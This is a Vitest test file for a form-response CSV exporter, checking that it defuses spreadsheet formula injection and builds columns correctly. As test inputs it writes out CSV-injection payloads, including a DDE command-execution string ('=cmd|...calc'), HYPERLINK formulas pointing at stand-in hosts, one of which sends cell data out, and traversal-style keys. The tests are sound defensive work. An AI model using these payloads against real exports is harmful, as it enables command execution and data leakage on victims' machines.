import { describe, expect, it } from "vitest";
import type { FormField } from "../../../src/core/forms";
import {
  csvCell,
  csvRow,
  csvValue,
  type ResponseRow,
  responseCsvColumns,
} from "../../../src/server/form-responses";

/**
 * The CSV export's pure half (`docs/specs/content-model/forms.md` decision 16).
 *
 * **This file is a security test wearing a formatting test's clothes.** A form's
 * entire input surface is anonymous strangers, and a CSV is a file somebody opens
 * in Excel — so `=cmd|'/c calc'!A1` in a name field is not a hypothetical, it is
 * the obvious thing to try. Two rules carry it and both are asserted here:
 *
 *  - a cell whose first character is `=`, `+`, `-`, `@`, a tab or a carriage
 *    return is prefixed with an apostrophe, which is what Excel and Sheets both
 *    read as "this is text";
 *  - RFC 4180 quoting applies **on top of** the prefix, never instead of it.
 *
 * The header's own rules are here for a different reason: a column that has
 * stopped being asked must keep its data and stop being confused with one that is
 * still live, which is what makes a two-year-old response readable at all
 * (decision 7).
 */

const field = (name: string, over: Partial<FormField> = {}): FormField =>
  ({ name, kind: "text", label: name, ...over }) as FormField;

const response = (over: Partial<ResponseRow> = {}): ResponseRow => ({
  id: "res_0123456789ab",
  formId: "frm_0123456789ab",
  version: 3,
  createdAt: Date.UTC(2026, 8, 6, 9, 30),
  data: {},
  locale: "",
  page: "",
  files: [],
  unasked: [],
  optionLabels: {},
  deliveries: [],
  ...over,
});

describe("csvCell", () => {
  it("leaves an ordinary value exactly as it arrived", () => {
    expect(csvCell("Ada Lovelace")).toBe("Ada Lovelace");
    expect(csvCell("")).toBe("");
    expect(csvCell("1 + 1")).toBe("1 + 1");
  });

  it("de-fangs every leading character a spreadsheet reads as code", () => {
    // The four decision 16 names.
    expect(csvCell("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
    expect(csvCell("+1 555 0100")).toBe("'+1 555 0100");
    expect(csvCell("-1")).toBe("'-1");
    expect(csvCell("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
  });

  it("de-fangs the two whitespace characters Excel skips before it looks", () => {
    // `\t=1+1` is a formula, and a check on `=` alone lets it straight through.
    // A tab needs no RFC 4180 quoting, so the prefix is the whole treatment; a
    // carriage return needs both.
    expect(csvCell("\t=1+1")).toBe("'\t=1+1");
    expect(csvCell("\r=1+1")).toBe('"\'\r=1+1"');
  });

  it("quotes a comma, a quote and a newline per RFC 4180", () => {
    expect(csvCell("Smith, Ada")).toBe('"Smith, Ada"');
    expect(csvCell('she said "no"')).toBe('"she said ""no"""');
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  it("applies the apostrophe **and** the quoting, not one instead of the other", () => {
    // The order is what makes this right: the prefix goes inside the quotes, so
    // the cell reads as text and the file still parses.
    expect(csvCell('=HYPERLINK("http://x/"&A2,"go")')).toBe(
      '"\'=HYPERLINK(""http://x/""&A2,""go"")"',
    );
    expect(csvCell("-1,000")).toBe('"\'-1,000"');
  });
});

describe("csvRow", () => {
  it("joins with commas and ends with CRLF", () => {
    expect(csvRow(["a", "b"])).toBe("a,b\r\n");
  });

  it("de-fangs every cell, not just the first", () => {
    expect(csvRow(["ok", "=1+1"])).toBe("ok,'=1+1\r\n");
  });
});

describe("responseCsvColumns", () => {
  const fields = [
    field("full_name"),
    field("email", { kind: "email" }),
    field("cv", { kind: "file" }),
  ];

  it("puts the five metadata columns first, in Folio’s reserved namespace", () => {
    const columns = responseCsvColumns(fields, []);
    expect(columns.slice(0, 5).map((c) => c.key)).toEqual([
      "_submitted_at",
      "_response_id",
      "_version",
      "_locale",
      "_page",
    ]);
    // Collision-proof rather than merely unlikely: a field name can never start
    // with `_`, so no submitted key is ever one of these.
    expect(columns.slice(0, 5).every((c) => c.source === "meta")).toBe(true);
  });

  it("follows them with the form’s current questions, in the builder’s order", () => {
    const columns = responseCsvColumns(fields, []);
    expect(columns.slice(5).map((c) => c.key)).toEqual(["full_name", "email", "cv"]);
    expect(columns.find((c) => c.key === "cv")?.file).toBe(true);
  });

  it("adds every retired key after them, sorted", () => {
    const columns = responseCsvColumns(fields, ["zip", "email", "company"]);
    expect(columns.slice(5).map((c) => c.key)).toEqual([
      "full_name",
      "email",
      "cv",
      "company",
      "zip",
    ]);
    expect(columns.find((c) => c.key === "zip")?.source).toBe("retired");
    // A key that is still a question is not retired, however it arrived.
    expect(columns.find((c) => c.key === "email")?.source).toBe("field");
  });

  it("drops a `statement`, which renders no input and stores nothing", () => {
    const columns = responseCsvColumns([field("note", { kind: "statement" }), field("x")], []);
    expect(columns.map((c) => c.key)).not.toContain("note");
  });

  it("screens a stored key against the field-name charset", () => {
    // A header cell is the one place in the export a value is not also a value,
    // and these keys come out of `json_each` over a column.
    const columns = responseCsvColumns([], ["=cmd", "Name", "../x", "ok_1"]);
    expect(columns.filter((c) => c.source === "retired").map((c) => c.key)).toEqual(["ok_1"]);
  });
});

describe("csvValue", () => {
  const columns = responseCsvColumns(
    [field("full_name"), field("happy", { kind: "checkbox" }), field("cv", { kind: "file" })],
    ["old_key"],
  );
  const at = (key: string) => columns.find((c) => c.key === key) ?? columns[0]!;

  it("renders a current field the response never answered as an em dash", () => {
    // "This did not exist yet" and "they left it blank" are different facts.
    expect(csvValue(at("full_name"), response())).toBe("—");
    expect(csvValue(at("full_name"), response({ data: { full_name: "" } }))).toBe("");
  });

  it("renders a list joined, and a tick box in a person’s words", () => {
    const column = { key: "picks", source: "retired" as const };
    expect(csvValue(column, response({ data: { picks: ["a", "b"] } }))).toBe("a, b");
    expect(csvValue(at("happy"), response({ data: { happy: true } }))).toBe("yes");
    expect(csvValue(at("happy"), response({ data: { happy: false } }))).toBe("no");
  });

  it("reads a file question out of the files column, since it stores no answer", () => {
    const row = response({
      files: [
        {
          field: "cv",
          key: "sub_00112233445566-cv.pdf",
          filename: "cv.pdf",
          size: 9,
          contentType: "x",
        },
      ],
    });
    expect(csvValue(at("cv"), row)).toBe("cv.pdf");
    expect(csvValue(at("cv"), response())).toBe("—");
  });

  it("answers each metadata column from the row rather than from the answers", () => {
    const row = response({ locale: "fr", page: "/contact", data: { _response_id: "forged" } });
    expect(csvValue(at("_submitted_at"), row)).toBe(new Date(row.createdAt).toISOString());
    expect(csvValue(at("_response_id"), row)).toBe("res_0123456789ab");
    expect(csvValue(at("_version"), row)).toBe("3");
    expect(csvValue(at("_locale"), row)).toBe("fr");
    expect(csvValue(at("_page"), row)).toBe("/contact");
  });
});

describe("csvValue: not asked (spec 35)", () => {
  const current = { key: "heard_other", source: "field" as const };
  const retired = { key: "old_one", source: "retired" as const };

  it("writes (not asked) for a current column the response was never asked", () => {
    expect(csvValue(current, response({ unasked: ["heard_other"] }))).toBe("(not asked)");
  });

  it("writes (not asked) for a retired column too", () => {
    expect(csvValue(retired, response({ unasked: ["old_one"] }))).toBe("(not asked)");
  });

  it("lets a file win over unasked", () => {
    const file = {
      field: "heard_other",
      key: "sub_x",
      filename: "cv.pdf",
      size: 1,
      contentType: "application/pdf",
    };
    expect(csvValue(current, response({ unasked: ["heard_other"], files: [file] }))).toBe("cv.pdf");
  });

  it("leaves an em dash for a blank that was asked, and for a response from before 0014", () => {
    expect(csvValue(current, response())).toBe("—");
    expect(csvValue(current, response({ unasked: ["something_else"] }))).toBe("—");
  });

  it("still writes the answer when the key is present", () => {
    expect(csvValue(current, response({ data: { heard_other: "hi" } }))).toBe("hi");
  });
});

describe("option labels (form-option-sources decision 13)", () => {
  const trip = field("trip", { kind: "select" });
  const trips = field("trips", { kind: "checkboxes" });
  const labels = { trip: { sty_a: "Serengeti" }, trips: { sty_a: "Serengeti", sty_b: "Bali" } };

  it("adds a `<name>:value` column after each labelled question, and only those", () => {
    const columns = responseCsvColumns([field("name"), trip, trips], [], ["trip"]);
    expect(columns.slice(5).map((c) => c.key)).toEqual(["name", "trip", "trip:value", "trips"]);
    expect(columns.find((c) => c.key === "trip")?.labelled).toBe(true);
    expect(columns.find((c) => c.key === "trip:value")?.rawOf).toBe("trip");
    expect(columns.find((c) => c.key === "trips")?.labelled).toBeUndefined();
  });

  it("adds none when nothing is labelled, so an unsourced form's header is unchanged", () => {
    const columns = responseCsvColumns([field("name"), trip], ["name", "trip"]);
    expect(columns.slice(5).map((c) => c.key)).toEqual(["name", "trip"]);
  });

  it("keeps a retired labelled key's pair, after the declared columns", () => {
    const columns = responseCsvColumns([field("name")], ["name", "zone"], ["zone"]);
    expect(columns.slice(5).map((c) => c.key)).toEqual(["name", "zone", "zone:value"]);
  });

  it("screens a labelled key against the field-name charset", () => {
    const columns = responseCsvColumns(
      [],
      ["ok", 'x"\n=1', "a:value"],
      ["ok", 'x"\n=1', "a:value"],
    );
    expect(columns.slice(5).map((c) => c.key)).toEqual(["ok", "ok:value"]);
  });

  it("writes the label in the labelled column and the stored value beside it", () => {
    const [label, raw] = responseCsvColumns([trip], [], ["trip"]).slice(5);
    const r = response({ data: { trip: "sty_a" }, optionLabels: labels });
    expect(csvValue(label!, r)).toBe("Serengeti");
    expect(csvValue(raw!, r)).toBe("sty_a");
  });

  it("maps each checkboxes value, joined, and falls back to the value with no label", () => {
    const [label, raw] = responseCsvColumns([trips], [], ["trips"]).slice(5);
    const r = response({ data: { trips: ["sty_a", "sty_b", "sty_c"] }, optionLabels: labels });
    expect(csvValue(label!, r)).toBe("Serengeti, Bali, sty_c");
    expect(csvValue(raw!, r)).toBe("sty_a, sty_b, sty_c");
  });

  it("reads a response from before the question was sourced as its value, in both columns", () => {
    const [label, raw] = responseCsvColumns([trip], [], ["trip"]).slice(5);
    const r = response({ data: { trip: "red" } });
    expect(csvValue(label!, r)).toBe("red");
    expect(csvValue(raw!, r)).toBe("red");
  });

  it("keeps the em dash and (not asked) in both columns", () => {
    const [label, raw] = responseCsvColumns([trip], [], ["trip"]).slice(5);
    expect(csvValue(label!, response())).toBe("—");
    expect(csvValue(raw!, response())).toBe("—");
    const skipped = response({ unasked: ["trip"] });
    expect(csvValue(label!, skipped)).toBe("(not asked)");
    expect(csvValue(raw!, skipped)).toBe("(not asked)");
  });

  it("does not use the labels on an unlabelled column", () => {
    const [plain] = responseCsvColumns([trip], []).slice(5);
    expect(csvValue(plain!, response({ data: { trip: "sty_a" }, optionLabels: labels }))).toBe(
      "sty_a",
    );
  });

  it("de-fangs a label that begins with a formula character, after quoting rules", () => {
    const [label] = responseCsvColumns([trip], [], ["trip"]).slice(5);
    const r = response({
      data: { trip: "sty_x" },
      optionLabels: { trip: { sty_x: '=HYPERLINK("http://evil")' } },
    });
    expect(csvRow([csvValue(label!, r)])).toBe(`"'=HYPERLINK(""http://evil"")"\r\n`);
    const plus = response({ data: { trip: "sty_x" }, optionLabels: { trip: { sty_x: "+1 555" } } });
    expect(csvRow([csvValue(label!, plus)])).toBe("'+1 555\r\n");
  });
});
